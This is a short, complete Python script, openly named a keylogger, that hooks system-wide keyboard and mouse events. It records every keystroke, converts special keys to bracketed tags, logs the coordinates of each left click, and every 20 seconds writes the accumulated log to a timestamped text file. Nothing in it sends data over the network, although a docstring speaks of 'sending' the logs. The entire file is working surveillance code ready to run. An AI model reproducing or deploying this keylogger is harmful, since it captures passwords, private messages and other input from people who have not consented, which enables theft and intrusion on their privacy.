# -*- coding: utf-8 -*-
import keyboard
import mouse
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 20 # in seconds, 60 means 1 minute and so on

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def keyboard_callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def mouse_callback(self):
        self.log += f"[L_CLICK, {mouse.get_position()}]"
    
    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""

        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        filename = f"keylog-{start_dt_str}_{end_dt_str}"

        # open the file in write mode (create it)
        with open(f"{filename}.txt", "w", encoding="utf-8") as file:
            file.write(self.log)
        print(f"Saved {filename}.txt")

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            self.end_dt = datetime.now()
            self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""

        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_press(callback=self.keyboard_callback)
        mouse.on_click(callback=self.mouse_callback)
        self.report()

        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()